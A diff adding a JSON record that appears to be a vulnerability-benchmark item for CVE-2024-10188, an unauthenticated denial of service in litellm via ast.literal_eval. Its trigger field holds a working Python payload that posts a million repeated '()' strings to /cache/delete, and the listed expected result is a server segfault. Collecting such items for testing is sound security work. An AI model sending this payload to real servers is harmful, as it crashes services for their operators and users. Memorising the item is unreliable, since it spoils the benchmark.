@@ -1,0 +1,15 @@
+{
+  "file_id": "68_litellm_huntr_96a32812-213c-4819-ba4e-36143d35e95b",
+  "numeric_id": "68",
+  "library_hint": "litellm",
+  "source": "huntr",
+  "title": "Unauthenticated denial of service via unsafe use of ast.literal_eval in litellm",
+  "cve": "CVE-2024-10188",
+  "cwe": "CWE-400: Denial of Service",
+  "library": "litellm",
+  "affected_version": "git 26c03c9",
+  "vulnerable_function": "ast.literal_eval",
+  "triggerability": "direct",
+  "trigger_payload": "import requests\npayload = '()' * 1000000\nresponse = requests.post('{BASE_URL}/cache/delete', data=payload)",
+  "oracle": "server crashes with SIGSEGV segmentation fault"
+}
